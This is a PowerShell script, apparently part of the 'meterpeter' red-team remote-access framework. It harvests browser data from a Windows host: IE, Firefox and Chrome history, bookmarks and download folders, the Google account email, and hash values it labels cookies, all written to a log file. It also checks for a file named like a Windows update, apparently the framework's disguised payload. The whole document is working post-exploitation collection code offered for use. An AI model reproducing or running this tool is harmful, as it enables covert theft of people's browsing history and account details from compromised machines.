<#
.SYNOPSIS
  Standalone Powershell script that will dump Local-Host browsers information.

.Author r00t-3xp10it (SSA RedTeam @2020)
  Required Dependencies: IE, Firefox, Chrome
  Optional Dependencies: None
  PS Script Dev Version: v1.10

.DESCRIPTION
   Standalone Powershell script to dump Local-host browser information sutch as: HomePage, Browser Version
   Language Used, Download Directory, URL History, Bookmarks, etc.. The dumps will be Saved into $env:TMP
   Folder. Unless this script 2º argument its used to input another LogFile storage location.

.EXAMPLE
   PS C:\> ./GetBrowser.ps1 -RECON
   Fast Recon (Browsers and versions)

.EXAMPLE
   PS C:\> ./GetBrowser.ps1 -ALL
   Enumerates Internet Explorer (IE), FireFox and Chrome Browsers information.

.EXAMPLE
   PS C:\> ./GetBrowser.ps1 -FIREFOX
   Enumerates FireFox Browser information Only.

.EXAMPLE
   PS C:\> .\GetBrowser.ps1 -IE $env:LOCALAPPDATA
   Enumerates IE Browser Info and writes the logfile to: $env:LOCALAPPDATA\BrowserEnum.log

.EXAMPLE
   PS C:\> .\GetBrowser.ps1 -CHROME $env:USERPROFILE\Desktop
   Enumerates Chrome Browser Info and writes the logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
   
.LINK 
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowser.ps1
#>


$IPATH = pwd
$Path = $null
$param1 = $args[0] # User Inputs [Arguments]
$param2 = $args[1] # User Inputs [Arguments]
## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
If(-not($param2)){$LogFilePath = "$env:TMP"}else{$LogFilePath = "$param2"}
If(-not($param1)){
   ## Required (Mandatory) Parameters Settings
   echo "`nGetBrowser - Enumerate installed browser(s) information." > $LogFilePath\BrowserEnum.log
   echo "[ ERROR ] This script requires parameters (-args) to run ..`n" >> $LogFilePath\BrowserEnum.log
   echo "Syntax: <scriptname> <-arg>(mandatory) <arg>(optional)`n" >> $LogFilePath\BrowserEnum.log
   echo "The following mandatory args are available:" >> $LogFilePath\BrowserEnum.log
   echo "./GetBrowser.ps1 -RECON            Fast Recon (Browsers and versions)" >> $LogFilePath\BrowserEnum.log
   echo "./GetBrowser.ps1 -IE               Enumerates IE browser information Only." >> $LogFilePath\BrowserEnum.log
   echo "./GetBrowser.ps1 -ALL              Enumerates IE, Firefox, Chrome information." >> $LogFilePath\BrowserEnum.log
   echo "./GetBrowser.ps1 -CHROME           Enumerates Chrome Browser information Only." >> $LogFilePath\BrowserEnum.log
   echo "./GetBrowser.ps1 -FIREFOX          Enumerates Firefox Browser information Only.`n" >> $LogFilePath\BrowserEnum.log
   echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
   echo "./GetBrowser.ps1 -IE `$env:TMP      Enumerates selected browser and saves logfile to TEMP.`n" >> $LogFilePath\BrowserEnum.log
   Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
   If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){Start-Sleep -Seconds 12}
   exit
}else{
   echo "`n" > $LogFilePath\BrowserEnum.log
}


## [GetBrowser] PS Script Banner
Write-Host "GetBrowser - Enumerate installed browser(s) information." -ForeGroundColor Green
Write-Host "[i] Dumping Data To: $LogFilePath\BrowserEnum.log" -ForeGroundColor yellow -BackgroundColor Black
Start-sleep -Seconds 2


## Get System Default Configurations (OS distro)
$Caption = Get-CimInstance Win32_OperatingSystem|Format-List *|findstr /I /B /C:"Caption"
$ParseCap = $Caption -replace '                                   :','      :'
## Get System Default webBrowser
$DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice').ProgId
$Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''
$MInvocation = "WebBrowser   : "+"$Parse_Browser_Data"+" (PreDefined)";
## Get System UserAgent
$IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
$ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''
## Writting LogFile to the selected path in: { $param2 var }
echo "`n`nSystem Defaults" > $LogFilePath\BrowserEnum.log
echo "---------------" >> $LogFilePath\BrowserEnum.log
echo "$ParseCap" >> $LogFilePath\BrowserEnum.log 
echo "$ParsingIntSet" >> $LogFilePath\BrowserEnum.log 
## Get Flash Internal Settings
If(Test-Path "$env:WINDIR\system32\macromed\flash\flash.ocx"){
    $flash = Get-Item "$env:WINDIR\system32\macromed\flash\flash.ocx"|select *
    $flashName = $flash.versioninfo.InternalName
    echo "flashName    : $flashName" >> $LogFilePath\BrowserEnum.log
}
echo "$MInvocation" >> $LogFilePath\BrowserEnum.log


function ConvertFrom-Json20([object] $item){
    ## Json Files Convertion to text
    Add-Type -AssemblyName System.Web.Extensions
    $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    return ,$ps_js.DeserializeObject($item)    
}


function SYSTEM_DEFAULTS {
    ## Detect ALL Available browsers Installed
    $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice').ProgId
    $MInvocation = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''
    $IEVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
    If($IEVersion){$IEfound = "Found"}else{$IEfound = "False";$IEVersion = "            "}
    $Chrome_App = (Get-ItemProperty "HKCU:\Software\Google\Chrome\BLBeacon" -ErrorAction SilentlyContinue).version
    If($Chrome_App){$CHfound = "Found"}else{$CHfound = "False";$Chrome_App = "  "}
    If(Test-Path -Path "$env:APPDATA\Mozilla\Firefox\Profiles"){
        $FFfound = "Found"
        $Preferencies = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"
        $JsPrefs = Get-content $Preferencies|Select-String "extensions.lastPlatformVersion"
        $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
    }else{
        $FFfound = "False"
        $ParsingData = "  "
    }
    echo "`nBrowser      Status      Version         PreDefined" > $LogFilePath\BrowserEnum.log
    echo "-------      ------      ------          ----------" >> $LogFilePath\BrowserEnum.log
    echo "IE           $IEfound       $IEVersion    $MInvocation" >> $LogFilePath\BrowserEnum.log
    echo "FIREFOX      $FFfound       $ParsingData" >> $LogFilePath\BrowserEnum.log
    echo "CHROME       $CHfound       $Chrome_App" >> $LogFilePath\BrowserEnum.log
}


function IE_Dump {
  ## Retrieve IE Browser Information
  echo "`n`n`nIE Browser" >> $LogFilePath\BrowserEnum.log
  echo "----------" >> $LogFilePath\BrowserEnum.log
  $IEVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'Version' -ErrorAction SilentlyContinue|Select-Object 'Version'
  If(-not($IEVersion) -or $IEVersion -eq $null){
      echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
  }else{
      $IEData = $IEVersion -replace '@{Version=','Version      : ' -replace '}',''
      $KBNumber = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'svcKBNumber'|Select-Object 'svcKBNumber'
      $KBData = $KBNumber -replace '@{svcKBNumber=','KBUpdate     : ' -replace '}',''
      $RegPrefs = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'start page'|Select-Object 'Start Page'
      $ParsingData = $RegPrefs -replace '@{Start Page=','HomePage     : ' -replace '}',''
      $LocalPage = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'Search Page'|Select-Object 'Search Page'
      $ParsingLocal = $LocalPage -replace '@{Search Page=','SearchPage   : ' -replace '}',''
      $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
      $ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''
      $DownloadDir = Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "{374DE290-123F-4565-9164-39C4925E467B}"|findstr /I /C:"Downloads"
      $ParseDownload = $DownloadDir -replace '{374DE290-123F-4565-9164-39C4925E467B} :','Downloads    :'
      echo "$KBData" >> $LogFilePath\BrowserEnum.log
      echo "$IEData" >> $LogFilePath\BrowserEnum.log
      echo "$ParseDownload" >> $LogFilePath\BrowserEnum.log
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      echo "$ParsingLocal" >> $LogFilePath\BrowserEnum.log
  }

  ## Retrieve IE history URLs
  echo "`nIE History" >> $LogFilePath\BrowserEnum.log
  echo "----------" >> $LogFilePath\BrowserEnum.log
  $IEHistory = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue|findstr /B /I "url"
  If(-not($IEHistory) -or $IEHistory -eq $null){
      echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
  }else{
      Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"|findstr /B /I "url" >> $LogFilePath\BrowserEnum.log
  }

  ## Retrieve IE Bookmarks
  # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
  echo "`nIE Bookmarks" >> $LogFilePath\BrowserEnum.log
  echo "------------" >> $LogFilePath\BrowserEnum.log
  $URLs = Get-ChildItem -Path "$Env:SYSTEMDRIVE\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
  ForEach ($URL in $URLs) {
      if ($URL.FullName -match 'Favorites') {
          $User = $URL.FullName.split('\')[2]
          Get-Content -Path $URL.FullName | ForEach-Object {
              try {
                  if ($_.StartsWith('URL')) {
                      ## parse the .url body to extract the actual bookmark location
                      $URL = $_.Substring($_.IndexOf('=') + 1)
                          if($URL -match $Search) {
                              echo "$URL" >> $LogFilePath\BrowserEnum.log
                          }
                  }
              }
              catch {
                  echo "Error parsing url: $_" >> $LogFilePath\BrowserEnum.log
              }
          }
      }
  }
}


function FIREFOX {
  ## Retrieve FireFox Browser Information
  echo "`n`n`nFireFox Browser" >> $LogFilePath\BrowserEnum.log
  echo "---------------" >> $LogFilePath\BrowserEnum.log
  $Path = Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles";
  If($Path -eq $True){
      ## change to the correct directory structure
      cd $env:APPDATA\Mozilla\Firefox\Profiles\*.default

      ## get browser countryCode
      $JsPrefs = Get-content prefs.js|Select-String "browser.search.countryCode";
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.search.countryCode','countryCode  '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## get PlatformVersion
      $JsPrefs = Get-content prefs.js|Select-String "extensions.lastPlatformVersion"
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'extensions.lastPlatformVersion','Version      '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## get brownser startup page
      $JsPrefs = Get-content prefs.js|Select-String "browser.startup.homepage"
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.startup.homepage','HomePage     '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## get browser DownloadDir
      $JsPrefs = Get-content prefs.js|Select-String "browser.download.lastDir";
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.lastDir','Downloads    '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## Returning to working directory
      cd $IPATH
  }else{
      echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
  }

  ## Dump FIREFOX HISTORY URLs
  # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
  echo "`nFireFox History" >> $LogFilePath\BrowserEnum.log
  echo "---------------" >> $LogFilePath\BrowserEnum.log
  If($Path -eq $False) {
      echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
  }else{
      $Profiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\"
      $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
      Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique | % {
          $Value = New-Object -TypeName PSObject -Property @{
              FireFoxHistoryURL = $_
          }
          if ($Value -match $Search) {
              $ParsingData = $Value -replace '@{FireFoxHistoryURL=','' -replace '}',''
              echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
          }
      }
  }

  ## firefox bookmarks
  # $Bookmarks = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\bookmarkbackups\*.jsonlz4"
  # Get-Content $Bookmarks|ConvertFrom-String > bookmarks.log
  # foreach ($Bookmark in $Bookmarks.children) {
  #      Search-FxBookmarks -Bookmarks $Bookmark -PathSoFar $NewPath -SearchString $SearchString
  # }
}


function CHROME {
  ## Retrieve Google Chrome Browser Information
  echo "`n`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
  echo "--------------" >> $LogFilePath\BrowserEnum.log
  $Chrome_App = Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon' -ErrorAction SilentlyContinue
  If(-not($Chrome_App) -or $Chrome_App -eq $null){
      echo "Could not find any Browser Info .." >> $LogFilePath\BrowserEnum.log
  }else{
      $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
      ## Retrieve Download Pref Settings
      $Parse_String = $Preferencies_Path.split(",")
      $Search_Download = $Parse_String|select-string "download"
      $Store_Dump = $Search_Download[1] # download_history Property
      $Parse_Dump = $Store_Dump -replace '"','' -replace ':',' : '
      echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log

      ## Retrieve Browser accept languages
      $Parse_String = $Preferencies_Path.split(",")
      $Search_Lang = $Parse_String|select-string "accept_languages"
      $Parse_Dump = $Search_Lang -replace '"','' -replace 'intl:{','' -replace ':',' : '
      echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log

      ## Retrieve Browser Version
      $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
      echo "Version          : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log

      ## Retrieve Email from Google CHROME preferencies File ..
      $Parse_String = $Preferencies_Path.split(",")
      $Search_Email = $Parse_String|select-string "email"
      $Parse_Dump = $Search_Email -replace ' ','' -replace '"','' -replace ':','            : '

      If(-not($Search_Email) -or $Search_Email -eq $null){
          echo "Email            : None Email Found .." >> $LogFilePath\BrowserEnum.log
      }else{
          echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
      }
  }

  ## Retrieve Chrome History
  # Source: https://github.com/hematic/Helper-Functions/blob/8d5e7a8b41e87ce3f54dc06c40aa1ae5f90c1cfc/Get-BrowserData.ps1
  echo "`nChrome History" >> $LogFilePath\BrowserEnum.log
  echo "--------------" >> $LogFilePath\BrowserEnum.log
  $History_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
  If(-not(Test-Path -Path $History_Path)){
      echo "Could not find any History .." >> $LogFilePath\BrowserEnum.log
  }else{
      $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
      $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
      $Get_Values | ForEach-Object {
          $Key = $_
          if ($Key -match $Search){
              echo "$_" >> $LogFilePath\BrowserEnum.log
          }
      }
  }

  ## Retrieve Chrome bookmarks
  echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
  echo "----------------" >> $LogFilePath\BrowserEnum.log
  $Bookmarks_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
  If(-not(Test-Path -Path $Bookmarks_Path)) {
      echo "Could not find any Bookmarks .." >> $LogFilePath\BrowserEnum.log
  }else{
      $Json = Get-Content $Bookmarks_Path
      $Output = ConvertFrom-Json20($Json)
      $Jsonobject = $Output.roots.bookmark_bar.children
      $Jsonobject.url |Sort -Unique | ForEach-Object {
          if ($_ -match $Search) {
              echo "$_" >> $LogFilePath\BrowserEnum.log
          }
      }
  }

  ## Retrieve Chrome Cookies (hashs)
  echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
  echo "--------------" >> $LogFilePath\BrowserEnum.log
  $Cookie_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
  If(-not(Test-Path -Path $Cookie_Path)){
      echo "Could not find any Cookies .." >> $LogFilePath\BrowserEnum.log
  }else{
      $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
      $Parse_String = $Preferencies_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash"
      $BadChars = $Find_MyHash -replace '"setting":{"hasHighScore":false',''
      $Dump_Key_Hash = $BadChars|where-object {$_}
      echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
  }
}


## Jump Links (Functions)
If($param1 -eq "-IE"){IE_Dump}
If($param1 -eq "-CHROME"){CHROME}
If($param1 -eq "-RECON"){SYSTEM_DEFAULTS}
If($param1 -eq "-FIREFOX"){FIREFOX}
If($param1 -eq "-ALL"){SYSTEM_DEFAULTS;IE_Dump;FIREFOX;CHROME}

## Build displays
# New-Object -TypeName PSObject -Property @{
#     Data = $_
# }

## Retrieve Remote Info from LogFile
Get-Content $LogFilePath\BrowserEnum.log;Write-Host "`n";
Write-Host "[i] Logfile: $LogFilePath\BrowserEnum.log" -ForeGroundColor yellow -BackGroundColor Black
exit
